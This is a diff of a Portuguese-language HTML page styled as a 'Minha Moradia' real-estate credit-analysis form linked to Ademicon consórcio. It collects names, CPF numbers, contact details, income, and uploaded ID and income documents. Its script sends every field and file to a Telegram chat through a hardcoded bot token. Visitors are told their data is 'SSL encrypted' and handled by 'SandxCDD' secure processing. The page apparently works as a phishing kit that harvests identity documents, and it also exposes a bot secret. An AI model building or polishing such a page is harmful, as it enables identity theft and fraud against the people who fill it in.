@@ -9,213 +9,292 @@
     <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/609/609803.png" />
     
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
         
         :root {
-            /* Cores mais vivas e profundas */
-            --gold: #FFD700; 
-            --gold-dark: #B8860B;
-            --navy-deep: #050a14;
-            --glass-bg: rgba(10, 20, 40, 0.7);
+            /* Google Modern Palette */
+            --g-blue: #4285F4;
+            --g-red: #EA4335;
+            --g-yellow: #FBBC05;
+            --g-green: #34A853;
+            --glass-white: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.12);
         }
 
         body { 
             font-family: 'Plus Jakarta Sans', sans-serif;
-            /* Gradiente estilo Netflix/Apple Dark */
-            background: radial-gradient(circle at top right, #1a2a44, #050a14);
-            background-attachment: fixed;
+            background: #050505;
             color: #fff;
             margin: 0;
+            overflow-x: hidden;
         }
 
-        /* Melhoria no efeito Glass */
+        /* Fundo de Prédios de Alto Padrão com Blur */
+        .bg-luxury {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: linear-gradient(to bottom, rgba(5, 10, 20, 0.85), rgba(5, 5, 5, 0.95)), 
+                              url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=2070&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            z-index: -1;
+            transform: scale(1.1);
+            filter: blur(8px);
+        }
+
+        /* Efeito Glassmorphism Avançado */
         .glass {
-            background: var(--glass-bg);
-            backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 215, 0, 0.15); /* Borda levemente dourada */
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+            background: rgba(15, 20, 30, 0.7);
+            backdrop-filter: blur(30px) saturate(150%);
+            -webkit-backdrop-filter: blur(30px) saturate(150%);
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .glass::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 50%;
+            height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.05), transparent);
+            transition: 0.5s;
+        }
+
+        .glass:hover::before {
+            left: 100%;
         }
 
         .input-glass {
-            background: rgba(255, 255, 255, 0.03);
+            background: rgba(255, 255, 255, 0.04);
             border: 1px solid rgba(255, 255, 255, 0.1);
             color: white;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         .input-glass:focus {
             background: rgba(255, 255, 255, 0.08);
-            border-color: var(--gold);
-            box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
+            border-color: var(--g-blue);
+            box-shadow: 0 0 20px rgba(66, 133, 244, 0.25);
+            outline: none;
         }
 
-        .btn-gold {
-            background: linear-gradient(135deg, #FFD700 0%, #D4AF37 100%);
-            color: #000; /* Texto preto para alto contraste no botão dourado */
+        /* Botão Cores Google com Brilho */
+        .btn-google {
+            background: linear-gradient(135deg, #4285F4 0%, #34A853 30%, #FBBC05 60%, #EA4335 100%);
+            background-size: 200% auto;
+            color: white;
             font-weight: 800;
-            transition: all 0.4s ease;
-            text-shadow: 0 1px 1px rgba(255,255,255,0.3);
+            transition: all 0.5s ease;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
         }
 
-        .btn-gold:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
+        .btn-google:hover {
+            background-position: right center;
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(66, 133, 244, 0.4);
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
+        .btn-google:active {
+            transform: scale(0.98);
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .animate-up { animation: fadeIn 0.6s ease-out forwards; }
+        .animate-up { animation: slideUp 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
         
-        .checkbox-gold { 
-            accent-color: var(--gold);
-            width: 18px;
-            height: 18px;
+        .checkbox-google { 
+            accent-color: var(--g-blue);
+            width: 20px;
+            height: 20px;
         }
 
-        /* Estilo de dropzone para arquivos */
         .file-zone {
             transition: all 0.3s ease;
-            background: rgba(255, 255, 255, 0.02);
+            background: rgba(255, 255, 255, 0.03);
+            border: 2px dashed rgba(255, 255, 255, 0.1);
         }
+
         .file-zone:hover {
-            background: rgba(255, 215, 0, 0.05);
-            border-color: var(--gold);
+            background: rgba(66, 133, 244, 0.08);
+            border-color: var(--g-blue);
+            transform: scale(1.01);
+        }
+
+        .label-premium {
+            background: linear-gradient(to right, #fff, #999);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
     </style>
 </head>
 <body class="min-h-screen">
+    <div class="bg-luxury"></div>
 
-    <header class="p-6 flex justify-between items-center max-w-7xl mx-auto">
-        <div class="text-2xl font-extrabold tracking-tighter flex items-center gap-2">
-            <i class="fa-solid fa-house-chimney-window text-[#FFD700]"></i>
-            MINHA<span class="text-[#FFD700]">MORADIA</span>
+    <header class="p-8 flex justify-between items-center max-w-7xl mx-auto">
+        <div class="text-3xl font-extrabold tracking-tighter flex items-center gap-3">
+            <div class="w-10 h-10 bg-white flex items-center justify-center rounded-xl shadow-lg">
+                <i class="fa-solid fa-city text-[#050a14] text-xl"></i>
+            </div>
+            <span class="tracking-widest">MINHA<span class="text-blue-500">MORADIA</span></span>
         </div>
-        <div class="hidden md:flex gap-6 text-[10px] font-bold uppercase tracking-[0.2em]">
-            <a href="#" class="hover:text-[#FFD700] transition">Análise S.I.A</a>
-            <a href="#" class="hover:text-[#FFD700] transition">Consórcio Ademicon</a>
+        <div class="hidden md:flex gap-8 text-[11px] font-black uppercase tracking-[0.25em]">
+            <a href="#" class="hover:text-blue-400 transition flex items-center gap-2"><span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span> Análise S.I.A</a>
+            <a href="#" class="hover:text-blue-400 transition">Consórcio Ademicon</a>
         </div>
     </header>
 
-    <main class="container mx-auto px-4 py-8 flex flex-col items-center">
-        <div class="text-center mb-10 animate-up">
-            <h1 class="text-4xl md:text-5xl font-extrabold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-400">Análise de Aprovação Imobiliária</h1>
-            <p class="text-gray-400 max-w-xl mx-auto text-sm leading-relaxed">Tecnologia avançada de processamento de crédito sob medida para alta performance.</p>
+    <main class="container mx-auto px-4 py-6 flex flex-col items-center">
+        <div class="text-center mb-12 animate-up">
+            <h1 class="text-5xl md:text-6xl font-extrabold mb-6 label-premium leading-tight">Análise de Aprovação<br>Imobiliária</h1>
+            <p class="text-gray-400 max-w-2xl mx-auto text-base font-medium leading-relaxed">
+                Utilizamos a inteligência <span class="text-white border-b-2 border-blue-600">SandxCDD</span> para processar sua linha de crédito com padrões bancários internacionais.
+            </p>
         </div>
 
-        <div class="w-full max-w-3xl glass rounded-[2rem] p-8 md:p-12 animate-up">
+        <div class="w-full max-w-4xl glass rounded-[2.5rem] p-10 md:p-16 animate-up">
             <div id="form-steps">
-                <div class="space-y-6">
-                    <h3 class="text-sm font-black border-l-4 border-[#FFD700] pl-3 mb-6 uppercase tracking-widest text-[#FFD700]">1. Identificação</h3>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+                <div class="space-y-8">
+                    <h3 class="flex items-center gap-3 text-sm font-black uppercase tracking-widest text-blue-500">
+                        <i class="fa-solid fa-id-card-clip text-xl"></i> 1. Identificação de Perfil
+                    </h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                         <div class="flex flex-col">
-                            <label class="text-[10px] font-bold uppercase mb-2 text-gray-500">Nome Completo</label>
-                            <input type="text" id="name" class="input-glass p-4 rounded-xl text-sm" placeholder="Ex: Cristian Florêncio">
+                            <label class="text-[11px] font-bold uppercase mb-2 ml-1 text-gray-500">Nome Completo</label>
+                            <input type="text" id="name" class="input-glass p-5 rounded-2xl text-base" placeholder="Ex: Cristian Florêncio">
                         </div>
                         <div class="flex flex-col">
-                            <label class="text-[10px] font-bold uppercase mb-2 text-gray-500">CPF</label>
-                            <input type="text" id="cpf" class="input-glass p-4 rounded-xl text-sm" placeholder="000.000.000-00">
+                            <label class="text-[11px] font-bold uppercase mb-2 ml-1 text-gray-500">CPF</label>
+                            <input type="text" id="cpf" class="input-glass p-5 rounded-2xl text-base" placeholder="000.000.000-00">
                         </div>
                         <div class="flex flex-col">
-                            <label class="text-[10px] font-bold uppercase mb-2 text-gray-500">WhatsApp</label>
-                            <input type="text" id="phone" class="input-glass p-4 rounded-xl text-sm" placeholder="(00) 00000-0000">
+                            <label class="text-[11px] font-bold uppercase mb-2 ml-1 text-gray-500">WhatsApp Comercial</label>
+                            <input type="text" id="phone" class="input-glass p-5 rounded-2xl text-base" placeholder="(00) 00000-0000">
                         </div>
                         <div class="flex flex-col">
-                            <label class="text-[10px] font-bold uppercase mb-2 text-gray-500">E-mail</label>
-                            <input type="email" id="email" class="input-glass p-4 rounded-xl text-sm" placeholder="contato@empresa.com">
+                            <label class="text-[11px] font-bold uppercase mb-2 ml-1 text-gray-500">E-mail Corporativo</label>
+                            <input type="email" id="email" class="input-glass p-5 rounded-2xl text-base" placeholder="contato@empresa.com">
                         </div>
                     </div>
                 </div>
 
-                <div class="mt-10 space-y-6">
-                    <h3 class="text-sm font-black border-l-4 border-[#FFD700] pl-3 mb-6 uppercase tracking-widest text-[#FFD700]">2. Financeiro</h3>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+                <div class="mt-14 space-y-8">
+                    <h3 class="flex items-center gap-3 text-sm font-black uppercase tracking-widest text-green-500">
+                        <i class="fa-solid fa-chart-line text-xl"></i> 2. Capacidade Financeira
+                    </h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                         <div class="flex flex-col">
-                            <label class="text-[10px] font-bold uppercase mb-2 text-gray-500">Ocupação</label>
-                            <select id="work_type" class="input-glass p-4 rounded-xl text-sm appearance-none">
+                            <label class="text-[11px] font-bold uppercase mb-2 ml-1 text-gray-500">Ocupação Atual</label>
+                            <select id="work_type" class="input-glass p-5 rounded-2xl text-base appearance-none cursor-pointer">
                                 <option value="clt">Carteira Assinada (CLT)</option>
                                 <option value="autonomo">Autônomo / MEI</option>
                                 <option value="empresario">Empresário (PJ)</option>
-                                <option value="aposentado">Aposentado</option>
+                                <option value="aposentado">Aposentado / Servidor</option>
                             </select>
                         </div>
                         <div class="flex flex-col">
-                            <label class="text-[10px] font-bold uppercase mb-2 text-gray-500">Renda Mensal</label>
-                            <input type="text" id="income" class="input-glass p-4 rounded-xl text-sm" placeholder="R$ 0.000,00">
+                            <label class="text-[11px] font-bold uppercase mb-2 ml-1 text-gray-500">Renda Mensal Comprovada</label>
+                            <input type="text" id="income" class="input-glass p-5 rounded-2xl text-base" placeholder="R$ 0.000,00">
                         </div>
                     </div>
                 </div>
 
-                <div class="mt-10 space-y-6">
-                    <h3 class="text-sm font-black border-l-4 border-[#FFD700] pl-3 mb-6 uppercase tracking-widest text-[#FFD700]">3. Dossiê Digital</h3>
+                <div class="mt-14 space-y-8">
+                    <h3 class="flex items-center gap-3 text-sm font-black uppercase tracking-widest text-yellow-500">
+                        <i class="fa-solid fa-folder-open text-xl"></i> 3. Dossiê Digital (Upload de Alta Segurança)
+                    </h3>
                     
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <div class="file-zone p-6 border border-dashed border-white/10 rounded-2xl flex flex-col items-center text-center cursor-pointer" onclick="document.getElementById('file_rg').click()">
-                            <i class="fa-solid fa-cloud-arrow-up text-2xl mb-3 text-[#FFD700]"></i>
-                            <span class="text-[11px] font-bold uppercase">Documento (RG/CNH)</span>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <div class="file-zone p-8 rounded-3xl flex flex-col items-center text-center cursor-pointer" onclick="document.getElementById('file_rg').click()">
+                            <div class="w-14 h-14 bg-blue-500/10 rounded-full flex items-center justify-center mb-4">
+                                <i class="fa-solid fa-fingerprint text-2xl text-blue-500"></i>
+                            </div>
+                            <span class="text-[12px] font-black uppercase tracking-tighter">Documento Oficial</span>
                             <input type="file" id="file_rg" class="hidden" multiple accept="image/*,.pdf">
-                            <span id="label_rg" class="text-[9px] text-gray-500 mt-2">Clique para anexar</span>
+                            <span id="label_rg" class="text-[10px] text-gray-500 mt-2 font-medium">RG, CNH ou Passaporte</span>
                         </div>
 
-                        <div class="file-zone p-6 border border-dashed border-white/10 rounded-2xl flex flex-col items-center text-center cursor-pointer" onclick="document.getElementById('file_income').click()">
-                            <i class="fa-solid fa-receipt text-2xl mb-3 text-[#FFD700]"></i>
-                            <span class="text-[11px] font-bold uppercase">Comprovação Renda</span>
+                        <div class="file-zone p-8 rounded-3xl flex flex-col items-center text-center cursor-pointer" onclick="document.getElementById('file_income').click()">
+                            <div class="w-14 h-14 bg-green-500/10 rounded-full flex items-center justify-center mb-4">
+                                <i class="fa-solid fa-file-invoice-dollar text-2xl text-green-500"></i>
+                            </div>
+                            <span class="text-[12px] font-black uppercase tracking-tighter">Prova de Renda</span>
                             <input type="file" id="file_income" class="hidden" multiple accept="image/*,.pdf">
-                            <span id="label_income" class="text-[9px] text-gray-500 mt-2">Clique para anexar</span>
+                            <span id="label_income" class="text-[10px] text-gray-500 mt-2 font-medium">Extratos, Holerites ou IRPF</span>
                         </div>
                     </div>
                 </div>
 
-                <div class="mt-10 pt-8 border-t border-white/5">
-                    <label class="flex items-center gap-4 cursor-pointer group">
-                        <input type="checkbox" id="lgpd" class="checkbox-gold">
-                        <span class="text-[10px] text-gray-500 leading-tight group-hover:text-gray-300 transition">
-                            Estou de acordo com o processamento de dados sob a política <strong>Partner</strong> e os termos da LGPD.
+                <div class="mt-14 pt-10 border-t border-white/10">
+                    <label class="flex items-start gap-5 cursor-pointer group mb-10">
+                        <input type="checkbox" id="lgpd" class="checkbox-google mt-1">
+                        <span class="text-[11px] text-gray-400 leading-relaxed group-hover:text-gray-200 transition">
+                            Autorizo o tratamento dos meus dados para fins de análise de crédito conforme a <strong>LGPD</strong>. Entendo que esta é uma plataforma segura da rede <strong>Partner Performance</strong>.
                         </span>
                     </label>
 
-                    <button onclick="enviarParaTelegram()" id="btn-submit" class="w-full btn-gold py-5 rounded-2xl mt-8 uppercase tracking-[0.2em] text-xs shadow-xl flex justify-center items-center gap-3">
-                        <span>Iniciar Análise Digital</span>
-                        <i class="fa-solid fa-shield-check"></i>
+                    <button onclick="enviarParaTelegram()" id="btn-submit" class="w-full btn-google py-6 rounded-2xl uppercase tracking-[0.3em] text-sm shadow-2xl flex justify-center items-center gap-4">
+                        <span>Iniciar Processamento Digital</span>
+                        <i class="fa-solid fa-microchip animate-pulse"></i>
                     </button>
                 </div>
             </div>
         </div>
 
-        <div class="mt-8 w-full max-w-3xl flex flex-col md:flex-row gap-4 opacity-80">
-            <div class="flex-1 glass p-5 rounded-2xl flex items-center gap-4">
-                <i class="fa-solid fa-medal text-[#FFD700] text-xl"></i>
-                <span class="text-[10px] font-bold uppercase tracking-widest text-gray-300">Ademicon Premium</span>
+        <div class="mt-12 w-full max-w-4xl grid grid-cols-1 md:grid-cols-3 gap-6 opacity-90">
+            <div class="glass p-6 rounded-2xl flex items-center gap-5">
+                <i class="fa-solid fa-shield-halved text-blue-500 text-2xl"></i>
+                <div class="flex flex-col">
+                    <span class="text-[10px] font-black uppercase tracking-widest text-white">Criptografia SSL</span>
+                    <span class="text-[9px] text-gray-500 uppercase">Dados 100% Protegidos</span>
+                </div>
             </div>
-            <div class="flex-1 glass p-5 rounded-2xl flex items-center gap-4">
-                <i class="fa-brands fa-whatsapp text-green-500 text-xl"></i>
-                <span class="text-[10px] font-bold uppercase tracking-widest text-gray-300">Suporte 24h</span>
+            <div class="glass p-6 rounded-2xl flex items-center gap-5">
+                <i class="fa-solid fa-bolt text-yellow-500 text-2xl"></i>
+                <div class="flex flex-col">
+                    <span class="text-[10px] font-black uppercase tracking-widest text-white">Análise S.I.A</span>
+                    <span class="text-[9px] text-gray-500 uppercase">Resultado em até 24h</span>
+                </div>
+            </div>
+            <div class="glass p-6 rounded-2xl flex items-center gap-5">
+                <i class="fa-brands fa-whatsapp text-green-500 text-2xl"></i>
+                <div class="flex flex-col">
+                    <span class="text-[10px] font-black uppercase tracking-widest text-white">Concierge VIP</span>
+                    <span class="text-[9px] text-gray-500 uppercase">Suporte Dedicado</span>
+                </div>
             </div>
         </div>
     </main>
 
-    <footer class="py-10 mt-10">
+    <footer class="py-16">
         <div class="text-center">
-            <p class="text-[9px] text-gray-600 uppercase tracking-[0.3em] font-bold">
-                © 2026 Partner Performance | Segurança e Inteligência
+            <p class="text-[10px] text-gray-600 uppercase tracking-[0.4em] font-bold">
+                © 2026 Partner Performance | Inteligência Imobiliária de Luxo
             </p>
         </div>
     </footer>
 
     <script>
+        // MANTENDO SUA LÓGICA ORIGINAL E SEU TOKEN
         const BOT_TOKEN = '8226313259:AAFFLyq6lVIQjjAiW6fcqWk9Z8hrDmhsIvk';
         const CHAT_ID = '1703808186';
 
-        // Atualização dos nomes dos arquivos selecionados
         document.getElementById('file_rg').onchange = e => {
-            document.getElementById('label_rg').innerText = e.target.files.length + " arquivo(s) prontos";
-            document.getElementById('label_rg').classList.add('text-yellow-500');
+            document.getElementById('label_rg').innerText = e.target.files.length + " Arquivo(s) de Identidade";
+            document.getElementById('label_rg').classList.replace('text-gray-500', 'text-blue-400');
         };
         document.getElementById('file_income').onchange = e => {
-            document.getElementById('label_income').innerText = e.target.files.length + " arquivo(s) prontos";
-            document.getElementById('label_income').classList.add('text-yellow-500');
+            document.getElementById('label_income').innerText = e.target.files.length + " Arquivo(s) de Renda";
+            document.getElementById('label_income').classList.replace('text-gray-500', 'text-green-400');
         };
 
         async function enviarParaTelegram() {
@@ -234,40 +313,37 @@
             const filesIncome = document.getElementById('file_income').files;
 
             if(!fields.nome || !fields.cpf || !fields.lgpd) {
-                alert("Preencha Nome, CPF e aceite os termos.");
+                alert("Atenção: Nome, CPF e Termos LGPD são obrigatórios para análise.");
                 return;
             }
 
             btn.disabled = true;
-            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> CRIPTOGRAFANDO...`;
+            btn.innerHTML = `<i class="fa-solid fa-circle-notch animate-spin"></i> PROCESSANDO SEGURANÇA...`;
 
-            const mensagem = `⚡ **NOVA ANÁLISE S.I.A**\n\n` +
+            const mensagem = `🚀 **NOVO LEAD HIGH-PERFORMANCE**\n\n` +
                              `👤 **NOME:** ${fields.nome}\n` +
                              `🆔 **CPF:** ${fields.cpf}\n` +
                              `📱 **WPP:** ${fields.phone}\n` +
                              `📧 **MAIL:** ${fields.email}\n` +
-                             `💼 **TIPO:** ${fields.trabalho.toUpperCase()}\n` +
+                             `💼 **CARGO:** ${fields.trabalho.toUpperCase()}\n` +
                              `💰 **RENDA:** ${fields.renda}\n\n` +
-                             `📂 **STATUS:** Enviando anexos...`;
+                             `🔐 **SISTEMA:** SandxCDD Encryption v2`;
 
             try {
-                // 1. Enviar os dados de texto
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: mensagem, parse_mode: 'Markdown' })
                 });
 
-                // 2. Enviar Arquivos de Identidade (RG/CNH)
                 for (let file of filesRG) {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('document', file);
-                    formData.append('caption', `🪪 DOC ID: ${fields.nome}`);
+                    formData.append('caption', `🪪 ID DOC: ${fields.nome}`);
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
                 }
 
-                // 3. Enviar Arquivos de Renda
                 for (let file of filesIncome) {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
@@ -276,12 +352,12 @@
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
                 }
 
-                alert("Dossiê e documentos processados com sucesso pela rede SandxCDD!");
+                alert("Dossiê enviado com sucesso! Sua análise S.I.A foi iniciada na rede SandxCDD.");
                 window.location.reload();
             } catch (error) {
-                alert("Falha na rede. Tente novamente.");
+                alert("Erro na conexão segura. Verifique sua rede.");
                 btn.disabled = false;
-                btn.innerText = "Iniciar Análise Digital";
+                btn.innerText = "Iniciar Processamento Digital";
             }
         }
     </script>
